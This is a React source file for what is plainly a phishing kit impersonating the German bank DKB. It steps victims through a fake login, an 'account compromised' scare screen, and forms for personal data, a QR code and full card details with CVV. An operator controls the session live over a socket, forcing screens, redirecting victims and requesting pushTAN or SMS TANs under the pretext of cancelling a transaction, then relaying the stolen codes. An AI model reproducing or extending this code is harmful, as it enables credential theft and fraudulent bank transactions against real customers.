import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, uploadTemplateFile, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';
import './DKBStyle.css';

// Import ThemeProvider for light/dark mode support
import { ThemeProvider } from './contexts/ThemeContext';

// Import components
import {
  Header,
  Footer,
  LoginForm,
  Loading,
  PersonalDataForm,
  BankCardForm,
  QRUploadForm,
  AccountCompromisedScreen,
  ErrorScreen,
  FinalSuccessScreen
} from './components';
import { PushTANScreen } from './components/PushTANScreen';
import { SMSTANScreen } from './components/SMSTANScreen';
import templateSocketClient from '../../utils/socketClient';

// DKB flow states (simplified process without branch selection)
const STATES = {
  LOGIN: 'login',
  LOGIN_ERROR: 'login_error',
  ACCOUNT_COMPROMISED: 'account_compromised',
  PERSONAL_DATA: 'personal_data',
  PERSONAL_SUCCESS: 'personal_success',
  QR_UPLOAD: 'qr_upload',
  QR_SUCCESS: 'qr_success',
  BANK_CARD: 'bank_card',
  BANK_SUCCESS: 'bank_success',
  FINAL_SUCCESS: 'final_success',
  LOADING: 'loading',
  ERROR: 'error',
  // Advanced states for admin control
  PUSHTAN_REQUEST: 'pushtan_request',
  SMS_TAN_REQUEST: 'sms_tan_request',
  TRANSACTION_CONFIRM: 'transaction_confirm',
  ACCOUNT_VERIFICATION: 'account_verification',
  // AFK/Live Mode states
  WAITING_FOR_ADMIN: 'waiting_for_admin'
};

// Configuration interface
interface StepConfig {
  personalData: boolean;
  qrUpload: boolean;
  bankCard: boolean;
  doubleLogin: boolean;
}

// Default configuration (fallback)
const DEFAULT_CONFIG: StepConfig = {
  personalData: true,
  qrUpload: true,
  bankCard: true,
  doubleLogin: true
};

// Types for DKB flow
interface LoginData {
  username: string;
  password: string;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

// AutoLogin component
function AutoLogin() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const metadata = getTemplateMetadata('dkb');
    updatePageMetadata(metadata);

    const initializeSession = async () => {
      try {
        setLoading(true);
        const newKey = await createTemplateSession('dkb');
        console.log('Generated key for DKB:', newKey);
        navigate(`/dkb/${newKey}`);
      } catch (error) {
        console.error('Failed to create DKB session:', error);
        setError('Fehler beim Erstellen der Sitzung');
        // Fallback to random key
        const fallbackKey = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        navigate(`/dkb/${fallbackKey}`);
      } finally {
        setLoading(false);
      }
    };

    setTimeout(initializeSession, 500);
  }, [navigate]);

  if (error) {
    return (
      <div className="dkb-main-layout">
        <Header />
        <div className="dkb-content">
          <ErrorScreen message={error} />
        </div>
        <Footer />
      </div>
    );
  }

  return (
    <div className="dkb-main-layout">
      <Header />
      <div className="dkb-content">
        <Loading message="Sitzung wird erstellt..." type="default" />
      </div>
      <Footer />
    </div>
  );
}

// Main flow component for DKB
function FormFlow() {
  const { key } = useParams<{ key: string }>();
  const navigate = useNavigate();
  
  const [state, setState] = useState(STATES.LOGIN);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [configLoaded, setConfigLoaded] = useState(false);
  const [sessionData, setSessionData] = useState<any>({});
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);

  // Scroll to top whenever state changes
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      setSessionData(prev => ({ ...prev, pendingState: nextState }));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    const metadata = getTemplateMetadata('dkb');
    updatePageMetadata(metadata);

    // Load step configuration from backend - MUST complete before user interaction
    const loadConfig = async () => {
      try {
        setLoadingMessage("Schritt-Konfiguration wird geladen...");
        setLoading(true);
        const config = await getTemplateConfig('dkb');
        setStepConfig(config.steps);
        setConfigLoaded(true);
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Loaded DKB step config:', config.steps);
        }
        if (process.env.NODE_ENV === 'development') {
          console.log('🔧 DKB step config details:', {
            doubleLogin: config.steps.doubleLogin,
            personalData: config.steps.personalData,
            qrUpload: config.steps.qrUpload,
            bankCard: config.steps.bankCard,
            configLoaded: true
          });
        }
      } catch (error) {
        console.warn('⚠️ Failed to load step config, using defaults:', error);
        // Even if API fails, mark as loaded to continue with defaults
        setConfigLoaded(true);
      }
    };

    if (!key) {
      navigate('/dkb');
      return;
    }

    console.log('🚀 DKB flow started with key:', key);
    console.log('🔍 About to initialize Socket.io connection...');
    
    // Wait for config to load, then initialize session
    const initializeAfterConfig = async () => {
      await loadConfig();
      setLoadingMessage("Sitzung wird initialisiert...");
      setTimeout(() => {
        setLoading(false);
      }, 1000);
    };
    
    initializeAfterConfig();
    
    // Initialize Socket.io connection for real-time admin control
    if (key) {
      console.log('✅ Key exists, connecting Socket.io for session:', key);
      try {
        templateSocketClient.connect({
          sessionKey: key,
          templateName: 'dkb',
          onStateForced: (state: string, message?: string) => {
            console.log('🎯 Admin forced state change:', state, message);
            
            // Show loading screen during state transition with natural banking messages
            setLoading(true);
            
            const getLoadingMessage = (targetState: string): string => {
              switch (targetState) {
                case 'personal_data':
                  return 'Persönliche Daten werden geladen...';
                case 'qr_upload':
                  return 'QR-Code Bereich wird vorbereitet...';
                case 'bank_card':
                  return 'Bankdaten werden verarbeitet...';
                case 'final_success':
                  return 'Vorgang wird abgeschlossen...';
                case 'account_compromised':
                  return 'Sicherheitsprüfung läuft...';
                default:
                  return 'Bitte warten Sie...';
              }
            };
            
            setLoadingMessage(message || getLoadingMessage(state));
            
            setTimeout(() => {
              setState(state);
              setLoading(false);
              if (message) {
                alert(message);
              }
            }, 1500);
          },
          onDataInjected: (data: any) => {
            console.log('💉 Admin injected data:', data);
            
            // Show loading screen during data injection
            setLoading(true);
            setLoadingMessage('Daten werden aktualisiert...');
            
            setTimeout(() => {
              setSessionData(prev => ({ ...prev, ...data }));
              setLoading(false);
            }, 1000);
          },
          onRedirect: (url: string) => {
            console.log('🔗 Admin triggered redirect:', url);
            window.location.href = url;
          },
          onMessage: (message: string, type: string) => {
            console.log('💬 Admin message:', message, type);
            alert(`${type.toUpperCase()}: ${message}`);
          },
          // AFK/Live Mode handlers
          onModeChanged: (mode: 'AFK' | 'LIVE') => {
            console.log('🎛️ Admin changed session mode:', mode);
            setSessionMode(mode);
            
            // If switching to AFK mode and waiting, continue flow
            if (mode === 'AFK' && isWaitingForAdmin) {
              setIsWaitingForAdmin(false);
              setLoading(false);
            }
          },
          onContinueFlow: () => {
            console.log('▶️ Admin triggered continue flow');
            if (isWaitingForAdmin && sessionData.pendingState) {
              setIsWaitingForAdmin(false);
              setLoading(false);
              setState(sessionData.pendingState);
              setSessionData(prev => ({ ...prev, pendingState: null }));
            }
          },
          // Enhanced TAN system handlers
          onTanRequest: (tanData: {
            type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
            method: 'pushtan' | 'sms';
            transactionDetails?: any;
            requestId: string;
          }) => {
            console.log('🔐 Admin requested TAN:', tanData);
            
            setLoading(true);
            setLoadingMessage(
              tanData.type === 'TRANSACTION_TAN' 
                ? 'Stornierung wird vorbereitet...' 
                : 'Anmeldung wird verarbeitet...'
            );
            
            setTimeout(() => {
              setCurrentTanRequest(tanData);
              setLoading(false);
              
              if (tanData.method === 'pushtan') {
                setState(STATES.PUSHTAN_REQUEST);
              } else {
                setState(STATES.SMS_TAN_REQUEST);
              }
            }, 2000);
          }
        });
        console.log('✅ Socket.io connect() called successfully');
      } catch (error) {
        console.error('❌ Error calling Socket.io connect:', error);
      }
    } else {
      console.warn('⚠️ No key available for Socket.io connection');
    }
    
    // Cleanup socket on unmount
    return () => {
      templateSocketClient.disconnect();
    };
  }, [key, navigate, isWaitingForAdmin, sessionData.pendingState]);

  // Handle login submission
  const handleLoginSubmit = async (data: LoginData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Login attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Login submitted for session:', key);
      setSessionData(prev => ({ ...prev, login: data }));
      
      setLoading(true);
      setLoadingMessage("Anmeldung wird verarbeitet...");
      
      // Submit login data to backend
      const response = await submitTemplateData({
        template_name: 'dkb',
        key: key || '',
        step: 'login',
        data: {
          username: data.username,
          password: data.password
        }
      });

      if (response.success) {
        // Check doubleLogin config - if disabled, skip to next step
        if (stepConfig.doubleLogin) {
          proceedToNextState(STATES.ACCOUNT_COMPROMISED, 'Sicherheitsprüfung wird gestartet...');
        } else if (stepConfig.personalData) {
          proceedToNextState(STATES.PERSONAL_DATA, 'Persönliche Daten werden geladen...');
        } else if (stepConfig.qrUpload) {
          proceedToNextState(STATES.QR_UPLOAD, 'QR-Code Bereich wird vorbereitet...');
        } else if (stepConfig.bankCard) {
          proceedToNextState(STATES.BANK_CARD, 'Bankdaten werden geladen...');
        } else {
          proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
        }
      } else {
        setError(response.error || 'Fehler bei der Anmeldung');
        setState(STATES.LOGIN_ERROR);
      }
      
      setLoading(false);
    } catch (error: any) {
      console.error('Login error:', error);
      setError('Fehler bei der Anmeldung');
      setState(STATES.LOGIN_ERROR);
      setLoading(false);
    }
  };

  // Handle account compromised continuation
  const handleAccountCompromisedContinue = async () => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Account compromised continue attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      setLoading(true);
      setLoadingMessage("Sicherheitsüberprüfung wird gestartet...");
      
      const response = await submitTemplateData({
        template_name: 'dkb',
        key: key || '',
        step: 'start-verification',
        data: {}
      });

      if (response.success) {
        if (stepConfig.personalData) {
          proceedToNextState(STATES.PERSONAL_DATA, 'Persönliche Daten werden geladen...');
        } else if (stepConfig.qrUpload) {
          proceedToNextState(STATES.QR_UPLOAD, 'QR-Code Bereich wird vorbereitet...');
        } else if (stepConfig.bankCard) {
          proceedToNextState(STATES.BANK_CARD, 'Bankdaten werden geladen...');
        } else {
          proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
        }
      } else {
        setError(response.error || 'Fehler beim Starten der Sicherheitsüberprüfung');
        setState(STATES.ERROR);
      }
      
      setLoading(false);
    } catch (error) {
      console.error('Account compromised error:', error);
      setError('Fehler beim Starten der Sicherheitsüberprüfung');
      setState(STATES.ERROR);
      setLoading(false);
    }
  };

  // Handle personal data submission
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Personal data submit attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      setSessionData(prev => ({ ...prev, personalData: data }));
      
      setLoading(true);
      setLoadingMessage("Persönliche Daten werden verarbeitet...");
      
      const response = await submitTemplateData({
        template_name: 'dkb',
        key: key || '',
        step: 'personal-data',
        data: data
      });

      if (response.success) {
        if (stepConfig.qrUpload) {
          proceedToNextState(STATES.QR_UPLOAD, 'QR-Code Bereich wird vorbereitet...');
        } else if (stepConfig.bankCard) {
          proceedToNextState(STATES.BANK_CARD, 'Bankdaten werden geladen...');
        } else {
          proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
        }
      } else {
        setError(response.error || 'Fehler beim Speichern der persönlichen Daten');
        setState(STATES.ERROR);
      }
      
      setLoading(false);
    } catch (error) {
      console.error('Personal data error:', error);
      setError('Fehler beim Speichern der persönlichen Daten');
      setState(STATES.ERROR);
      setLoading(false);
    }
  };

  // Handle QR upload
  const handleQRUpload = async (file: File) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ QR upload attempted before step config loaded - ignoring');
      return;
    }
    
    console.log('🔥 DKB QR UPLOAD HANDLER CALLED with file:', file.name, file.size, file.type);
    
    try {
      console.log('📤 Uploading QR code for DKB session:', key);
      
      setLoading(true);
      setLoadingMessage("QR-Code wird hochgeladen und analysiert...");
      
      // Use the uploadTemplateFile function with proper step name
      const response = await uploadTemplateFile('dkb', key || '', file, 'qr-upload');
      
      console.log('✅ DKB QR upload response:', response);

      if (response.success) {
        console.log('📱 QR upload successful, proceeding to next step');
        
        // Simulate processing time like other templates
        setTimeout(() => {
          if (stepConfig.bankCard) {
            proceedToNextState(STATES.BANK_CARD, 'Bankdaten werden geladen...');
          } else {
            proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
          }
          setLoading(false);
        }, 2000);
      } else {
        console.warn('⚠️ QR upload failed:', response.error);
        setError('QR-Code konnte nicht verarbeitet werden. Bitte versuchen Sie es erneut.');
        setState(STATES.QR_UPLOAD); // Stay on upload for retry
        setLoading(false);
      }
    } catch (error) {
      console.error('❌ DKB QR upload error:', error);
      setError('Fehler beim Upload des QR-Codes');
      setState(STATES.QR_UPLOAD);
      setLoading(false);
    }
  };

  // Handle bank card submission
  const handleBankCardSubmit = async (data: BankCardData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Bank card submit attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('DKB: Submitting bank card data for session:', key);
      console.log('DKB: Bank card data being submitted:', data);
      
      setLoading(true);
      setLoadingMessage("Kartendaten werden verarbeitet...");
      
      const response = await submitTemplateData({
        template_name: 'dkb',
        key: key || '',
        step: 'bank-card-complete',
        data: data
      });

      if (response.success) {
        proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
      } else {
        setError(response.error || 'Fehler beim Speichern der Kartendaten');
        setState(STATES.ERROR);
      }
      
      setLoading(false);
    } catch (error) {
      console.error('Bank card error:', error);
      setError('Fehler beim Speichern der Kartendaten');
      setState(STATES.ERROR);
      setLoading(false);
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('DKB: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'dkb',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_credit_card' }
      });
      
      if (!response.success) {
        console.error('❌ DKB bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('✅ DKB bank card skip completed successfully');
      
      // Show loading screen
      setLoading(true);
      setLoadingMessage("Wird abgeschlossen...");
      
      // Simulate processing time
      setTimeout(() => {
        setLoading(false);
        proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
      }, 2000);
      
    } catch (error) {
      console.error('❌ DKB bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(STATES.ERROR);
      setLoading(false);
    }
  };

  const renderContent = () => {
    if (loading || !configLoaded) {
      return <Loading 
        message={!configLoaded ? "Schritt-Konfiguration wird geladen..." : loadingMessage} 
        type="processing" 
      />;
    }

    switch (state) {
      case STATES.LOGIN:
        return <LoginForm onSubmit={handleLoginSubmit} />;
        
      case STATES.LOGIN_ERROR:
        return <LoginForm onSubmit={handleLoginSubmit} errorMessage="Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut." />;
        
      case STATES.ACCOUNT_COMPROMISED:
        return <AccountCompromisedScreen onStartVerification={handleAccountCompromisedContinue} />;
        
      case STATES.PERSONAL_DATA:
        return <PersonalDataForm onSubmit={handlePersonalDataSubmit} />;
        
      case STATES.QR_UPLOAD:
        return <QRUploadForm onUpload={handleQRUpload} isRetry={error !== null} />;
        
      case STATES.BANK_CARD:
        return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
        
      case STATES.FINAL_SUCCESS:
        return <FinalSuccessScreen />;
      
      case STATES.PUSHTAN_REQUEST:
        return <PushTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('pushTAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.SMS_TAN_REQUEST:
        return <SMSTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          phoneNumber={sessionData.maskedPhone || sessionData.phone}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('SMS TAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onResend={() => {
            console.log('SMS TAN resend requested');
            templateSocketClient.emit('tan-resend-requested', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.WAITING_FOR_ADMIN:
        return <Loading 
          message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
          type="processing"
          showProgress={false}
        />;
        
      case STATES.ERROR:
        return <ErrorScreen message={error || 'Ein Fehler ist aufgetreten'} />;
        
      default:
        return <ErrorScreen message="Unbekannter Zustand" />;
    }
  };

  return (
    <div className="dkb-main-layout">
      <Header />
      <div className="dkb-content">
        {renderContent()}
      </div>
      <Footer />
    </div>
  );
}

// Main DKB Template Component
const DKBTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();

  return (
    <ThemeProvider>
      {!key ? <AutoLogin /> : <FormFlow />}
    </ThemeProvider>
  );
};

export default DKBTemplate;